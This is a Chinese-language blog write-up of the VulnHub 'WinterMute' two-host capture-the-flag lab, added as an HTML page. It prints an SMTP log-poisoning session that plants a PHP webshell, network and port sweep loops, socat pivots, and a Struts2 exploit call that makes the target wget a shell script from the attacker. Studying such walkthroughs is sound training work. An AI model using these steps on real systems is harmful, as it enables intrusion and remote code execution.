@@ -1,0 +1,189 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>0x063 WinterMute | 养猪日记</title>
+<meta name=keywords content><meta name=description content="这台靶场是个双主机靶场
+第一台主机
+192.168.5.104
+端口扫描
+
+
+
+
+
+
+渗透
+80端口
+
+
+
+
+3000端口
+admin/admin直接进入：
+
+
+然后这里是我没想到的，这里是http的路径：
+
+
+打开：
+
+
+最开始没看懂什么意思，原来这里的意思是，选择一个人查看他的日志，但是这里看不了/etc/passwd，由于主机开放了25端口，可以看/var/log/mail的日志，就可以用25端口发邮件了：
+
+
+使用NC写入webshell：
+nc 192.168.5.108 25 			#连接邮件服务器
+helo root						#标识用户身份
+mail from:&#34;ROOT <?php system($_GET['a']);?>&#34;   #发件人，木马所在地
+rcpt to:root					#收件人
+data							#编辑
+.							    #编辑结束
+quit							#退出nc
+这里的木马有些问题，建议使用get请求，并且id什么的是执行不了的，ls是可以的，传参用&：
+
+
+反弹shell:
+
+
+
+
+提权
+SUID：
+
+
+
+
+
+
+
+
+
+"><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/posts/vulnhub/0x063-wintermute-/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/posts/vulnhub/0x063-wintermute-/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="0x063 WinterMute "><meta property="og:description" content="这台靶场是个双主机靶场
+第一台主机
+192.168.5.104
+端口扫描
+
+
+
+
+
+
+渗透
+80端口
+
+
+
+
+3000端口
+admin/admin直接进入：
+
+
+然后这里是我没想到的，这里是http的路径：
+
+
+打开：
+
+
+最开始没看懂什么意思，原来这里的意思是，选择一个人查看他的日志，但是这里看不了/etc/passwd，由于主机开放了25端口，可以看/var/log/mail的日志，就可以用25端口发邮件了：
+
+
+使用NC写入webshell：
+nc 192.168.5.108 25 			#连接邮件服务器
+helo root						#标识用户身份
+mail from:&#34;ROOT <?php system($_GET['a']);?>&#34;   #发件人，木马所在地
+rcpt to:root					#收件人
+data							#编辑
+.							    #编辑结束
+quit							#退出nc
+这里的木马有些问题，建议使用get请求，并且id什么的是执行不了的，ls是可以的，传参用&：
+
+
+反弹shell:
+
+
+
+
+提权
+SUID：
+
+
+
+
+
+
+
+
+
+"><meta property="og:type" content="article"><meta property="og:url" content="https://yangzhuzai.github.io/posts/vulnhub/0x063-wintermute-/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-11T14:25:59+08:00"><meta property="article:modified_time" content="2024-10-11T14:25:59+08:00"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="0x063 WinterMute "><meta name=twitter:description content="这台靶场是个双主机靶场
+第一台主机
+192.168.5.104
+端口扫描
+
+
+
+
+
+
+渗透
+80端口
+
+
+
+
+3000端口
+admin/admin直接进入：
+
+
+然后这里是我没想到的，这里是http的路径：
+
+
+打开：
+
+
+最开始没看懂什么意思，原来这里的意思是，选择一个人查看他的日志，但是这里看不了/etc/passwd，由于主机开放了25端口，可以看/var/log/mail的日志，就可以用25端口发邮件了：
+
+
+使用NC写入webshell：
+nc 192.168.5.108 25 			#连接邮件服务器
+helo root						#标识用户身份
+mail from:&#34;ROOT <?php system($_GET['a']);?>&#34;   #发件人，木马所在地
+rcpt to:root					#收件人
+data							#编辑
+.							    #编辑结束
+quit							#退出nc
+这里的木马有些问题，建议使用get请求，并且id什么的是执行不了的，ls是可以的，传参用&：
+
+
+反弹shell:
+
+
+
+
+提权
+SUID：
+
+
+
+
+
+
+
+
+
+"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://yangzhuzai.github.io/posts/"},{"@type":"ListItem","position":2,"name":"0x063 WinterMute ","item":"https://yangzhuzai.github.io/posts/vulnhub/0x063-wintermute-/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"0x063 WinterMute ","name":"0x063 WinterMute ","description":"这台靶场是个双主机靶场\n第一台主机 192.168.5.104\n端口扫描 渗透 80端口\n3000端口\nadmin/admin直接进入：\n然后这里是我没想到的，这里是http的路径：\n打开：\n最开始没看懂什么意思，原来这里的意思是，选择一个人查看他的日志，但是这里看不了/etc/passwd，由于主机开放了25端口，可以看/var/log/mail的日志，就可以用25端口发邮件了：\n使用NC写入webshell：\nnc 192.168.5.108 25 #连接邮件服务器\rhelo root\t#标识用户身份\rmail from:\u0026#34;ROOT \u0026lt;?php system($_GET[\u0026#39;a\u0026#39;]);?\u0026gt;\u0026#34; #发件人，木马所在地\rrcpt to:root\t#收件人\rdata\t#编辑\r.\t#编辑结束\rquit\t#退出nc 这里的木马有些问题，建议使用get请求，并且id什么的是执行不了的，ls是可以的，传参用\u0026amp;：\n反弹shell:\n提权 SUID：\n","keywords":[],"articleBody":"这台靶场是个双主机靶场\n第一台主机 192.168.5.104\n端口扫描 渗透 80端口\n3000端口\nadmin/admin直接进入：\n然后这里是我没想到的，这里是http的路径：\n打开：\n最开始没看懂什么意思，原来这里的意思是，选择一个人查看他的日志，但是这里看不了/etc/passwd，由于主机开放了25端口，可以看/var/log/mail的日志，就可以用25端口发邮件了：\n使用NC写入webshell：\nnc 192.168.5.108 25 #连接邮件服务器\rhelo root\t#标识用户身份\rmail from:\"ROOT \u003c?php system($_GET['a']);?\u003e\" #发件人，木马所在地\rrcpt to:root\t#收件人\rdata\t#编辑\r.\t#编辑结束\rquit\t#退出nc 这里的木马有些问题，建议使用get请求，并且id什么的是执行不了的，ls是可以的，传参用\u0026：\n反弹shell:\n提权 SUID：\n第二台靶机 第二网卡：\n192.168.56.103/24网段：\n本来想创建创建远程端口转发的，但是ssh版本不够：\nsudo systemctl restart ssh.service\nssh -N -R 9998 kali@192.168.5.66\n需要ssh版本7.6以及以上：\n那就挨个代理出来：\n先进行IP扫描：\nNET=192.168.56. ; for IP in $(seq 1 255); do if `ping -c2 -i0.2 -w2 $NET$IP \u0026\u003e /dev/null`; then echo -e \"$NET$IP is \\033[31mup\\033[0m\" ; else echo -e \"$NET$IP is \\033[32mdown\\033[0m\"; fi ; done 102可能性最大，端口扫描：\nfor i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.102 $i 2\u003e\u00261; done | grep -v \"Connection refused\" 用socat把端口代理出来：\nsocat TCP-LISTEN:8009,fork,reuseaddr tcp:192.168.56.102:8009 \u0026\rsocat TCP-LISTEN:8080,fork,reuseaddr tcp:192.168.56.102:8080 \u0026\rsocat TCP-LISTEN:34483,fork,reuseaddr tcp:192.168.56.102:34483 \u0026 重新扫描一下：\n打一半网断了，后面IP变了：\n这里没注意，原来note是提示：\n这个就显而易见了，struts2漏洞：\n先创建一个端口转发，以便于把shell传回kali:\nsocat TCP-LISTEN:9999,fork,reuseaddr tcp:192.168.5.66:9999 \u0026 去exploit-db找一个脚本：\n但是这里没反应，感觉是哪里有问题，既然nc和bash没反应，可以试试写入sh脚本：\n再建一个端口转发：\nsocat TCP-LISTEN:7777,fork,reuseaddr tcp:192.168.5.66:80 \u0026 python 42324.py http://192.168.5.111:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action “wget http://192.168.56.103:7777/shell.sh”\n有反应\n又失败了，放到tmp目录试试：\nmsfvenom:\n提权 2021-4034\n","wordCount":"146","inLanguage":"en","image":"https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-10-11T14:25:59+08:00","dateModified":"2024-10-11T14:25:59+08:00","author":{"@type":"Person","name":"养猪日记"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://yangzhuzai.github.io/posts/vulnhub/0x063-wintermute-/"},"publisher":{"@type":"Organization","name":"养猪日记","logo":{"@type":"ImageObject","url":"https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">0x063 WinterMute</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;146 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#端口扫描>端口扫描</a></li><li><a href=#渗透>渗透</a></li></ul></nav></div></details></div><div class=post-content><p>这台靶场是个双主机靶场</p><h1 id=第一台主机>第一台主机<a hidden class=anchor aria-hidden=true href=#第一台主机>#</a></h1><p>192.168.5.104</p><h2 id=端口扫描>端口扫描<a hidden class=anchor aria-hidden=true href=#端口扫描>#</a></h2><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE68c362deba429ae69fed45d9517b9ca8image.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEa844d08924c6c9dadd2bb5ffc0ee911dimage.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEdf5d149940645e9df81a43506f469ab1image.png alt></p><h2 id=渗透>渗透<a hidden class=anchor aria-hidden=true href=#渗透>#</a></h2><p>80端口</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE060cc8d1dc9a6d9c316b2b25b1a11c95image.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEc2c79a3c50e937e7793df04a89cd245cimage.png alt></p><p>3000端口</p><p>admin/admin直接进入：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE1e24b0dee6fe4c2b9da1c19f677f1f03image.png alt></p><p>然后这里是我没想到的，这里是http的路径：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEa2e96b80478f41f60c93808700481a0fimage.png alt></p><p>打开：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE53f87dad94e3a0ef6f07caad760c742eimage.png alt></p><p>最开始没看懂什么意思，原来这里的意思是，选择一个人查看他的日志，但是这里看不了/etc/passwd，由于主机开放了25端口，可以看/var/log/mail的日志，就可以用25端口发邮件了：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE2fec6124137d88692b38ab00d84133b0image.png alt></p><p>使用NC写入webshell：</p><pre tabindex=0><code>nc 192.168.5.108 25 			#连接邮件服务器
+helo root						#标识用户身份
+mail from:&#34;ROOT &lt;?php system($_GET[&#39;a&#39;]);?&gt;&#34;   #发件人，木马所在地
+rcpt to:root					#收件人
+data							#编辑
+.							    #编辑结束
+quit							#退出nc
+</code></pre><p>这里的木马有些问题，建议使用get请求，并且id什么的是执行不了的，ls是可以的，传参用&：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE2fa3b558d7bc141d559d5402c4cfcfc2image.png alt></p><p>反弹shell:</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE963c068bf535ff76fc31b0879b987ce6image.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE80b38633a18415990dacc18a3e179170image.png alt></p><h1 id=提权>提权<a hidden class=anchor aria-hidden=true href=#提权>#</a></h1><p>SUID：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE0427285f16c161ce1c6233b0adf8c7feimage.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEfc75302ecb7e9d34e40eb6105bab0402image.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEbfa6c620f5853a3cc13a7aab78f58b7dimage.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE508789be6ddfaa4e7751c8ea01b07641image.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEad6ded3d3605a4497411630063683c9eimage.png alt></p><h1 id=第二台靶机>第二台靶机<a hidden class=anchor aria-hidden=true href=#第二台靶机>#</a></h1><p>第二网卡：</p><p>192.168.56.103/24网段：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE44bde5ae34bf24033969f2e96d8dfeccimage.png alt></p><p>本来想创建创建远程端口转发的，但是ssh版本不够：</p><p>sudo systemctl restart ssh.service</p><p>ssh -N -R 9998 <a href=http://kali@192.168.5.66>kali@192.168.5.66</a></p><p>需要ssh版本7.6以及以上：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE506cf098d91af47c35f65e9fcc2a26eeimage.png alt></p><p>那就挨个代理出来：</p><p>先进行IP扫描：</p><pre tabindex=0><code>NET=192.168.56. ; for IP in $(seq 1 255); do if `ping -c2 -i0.2 -w2 $NET$IP &amp;&gt; /dev/null`; then echo -e &#34;$NET$IP is \033[31mup\033[0m&#34; ; else echo -e &#34;$NET$IP is \033[32mdown\033[0m&#34;;  fi ; done
+</code></pre><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE2ee8dba66e84ede94794aba403c6eecaimage.png alt></p><p>102可能性最大，端口扫描：</p><pre tabindex=0><code>for i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.102 $i 2&gt;&amp;1; done | grep -v &#34;Connection refused&#34;
+</code></pre><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE15703d7835e6c9fbcff64f91ee55de0aimage.png alt></p><p>用socat把端口代理出来：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEa157d5dbcba06da73ac7134a2147d73cimage.png alt></p><pre tabindex=0><code>socat TCP-LISTEN:8009,fork,reuseaddr tcp:192.168.56.102:8009 &amp;
+socat TCP-LISTEN:8080,fork,reuseaddr tcp:192.168.56.102:8080 &amp;
+socat TCP-LISTEN:34483,fork,reuseaddr tcp:192.168.56.102:34483 &amp;
+</code></pre><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE017206957e78a558751f5f69e2eb56b2image.png alt></p><p>重新扫描一下：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE93398a132faf925a6b1a936045ffdaf6image.png alt></p><p>打一半网断了，后面IP变了：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE4f998a09b6efff34f2764a1fd72a1993image.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE1cd5b6ce008108bc3a7c9ad77d08ba17image.png alt></p><p>这里没注意，原来note是提示：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEf03bc91d1e561d041b06bea5fe21e6b5image.png alt></p><p>这个就显而易见了，struts2漏洞：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE8c32ffbcd5282a46b31ec7c971c743beimage.png alt></p><p>先创建一个端口转发，以便于把shell传回kali:</p><pre tabindex=0><code>socat TCP-LISTEN:9999,fork,reuseaddr tcp:192.168.5.66:9999 &amp;
+</code></pre><p>去exploit-db找一个脚本：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEa9269de1cceb517cc694086d5d0af425image.png alt></p><p>但是这里没反应，感觉是哪里有问题，既然nc和bash没反应，可以试试写入sh脚本：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE273eb9f5ca755c7151db7a2a5fec477fimage.png alt></p><p>再建一个端口转发：</p><pre tabindex=0><code>socat TCP-LISTEN:7777,fork,reuseaddr tcp:192.168.5.66:80 &amp;
+</code></pre><p>python 42324.py <a href=http://192.168.5.111:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action>http://192.168.5.111:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action</a> &ldquo;wget <a href=http://192.168.56.103:7777/shell.sh>http://192.168.56.103:7777/shell.sh</a>&rdquo;</p><p>有反应</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE036f4cd67d3bcbc5a131d85024dc1fe0image.png alt></p><p>又失败了，放到tmp目录试试：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEed6004a575fbf4af8ca164949627dea5image.png alt></p><p>msfvenom:</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE503cf14f6615ad9193e16cd7628c8478image.png alt></p><h1 id=提权-1>提权<a hidden class=anchor aria-hidden=true href=#提权-1>#</a></h1><p>2021-4034</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE27e469b9c5e01820fb797dda5c4202b0image.png alt></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://yangzhuzai.github.io/posts/vulnhub/0x062-defcon-toronto-galahad/><span class=title>« Prev</span><br><span>0x062 DEFCON Toronto Galahad</span>
+</a><a class=next href=https://yangzhuzai.github.io/posts/vulnhub/0x064-digitalworld.localdevelopment/><span class=title>Next »</span><br><span>0x064 Digitalworld.local(Development)</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
